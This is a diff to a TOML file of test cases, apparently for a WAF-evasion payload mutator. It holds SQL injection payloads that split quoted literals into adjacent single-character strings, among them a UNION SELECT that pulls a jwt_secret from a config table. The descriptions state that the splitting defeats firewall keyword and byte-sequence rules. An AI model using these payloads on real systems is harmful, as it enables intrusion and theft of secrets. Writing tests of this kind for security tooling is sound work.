@@ -75,10 +75,10 @@ payload = "' UNION SELECT value FROM config WHERE key='j' 'w' 't' '_' 's' 'e' 'c
 description = "App-specific identifier hunt: `'jwt_secret'` shattered into 10 single-char literals. High-confidence WAF token (`jwt_secret` is in many keyword lists) — fragmentation defeats it."
 
 [[case]]
-id = "adjacent_concat_escaped_quote_passthrough"
+id = "adjacent_concat_escaped_quote_shatter"
 class = "sql"
-payload = "' OR name='O''Brien'--"
-description = "Defensive — literals containing the `''` escape sequence are NOT split (would break SQL semantics). Pass through verbatim. Validates the conservative-handling branch."
+payload = "' OR name='O' '''' 'B' 'r' 'i' 'e' 'n'--"
+description = "SQL `''` escape inside literal: each `'` shatters into the four-quote form `''''` (length-1 literal containing `'`). Database reassembles to original `O'Brien`. Defeats both literal-substring rules AND any rule keying on `'O''Brien'` byte sequence."
 
 [[case]]
 id = "adjacent_concat_double_literal_shatter"
